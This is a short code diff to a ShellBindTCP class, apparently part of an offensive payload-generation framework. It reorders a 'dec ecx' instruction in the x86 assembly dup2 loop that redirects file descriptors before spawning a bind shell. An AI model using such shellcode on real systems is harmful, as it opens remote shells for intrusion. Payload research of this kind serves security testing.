@@ -85,11 +85,11 @@ class ShellBindTCP(HatAsm, HatVenom, Words):
             pop ecx
 
         dup:
+            dec ecx
             push 0x3f
             pop eax
             int 0x80
 
-            dec ecx
             jns dup
             {shell_asm}
             mov ebx, esp
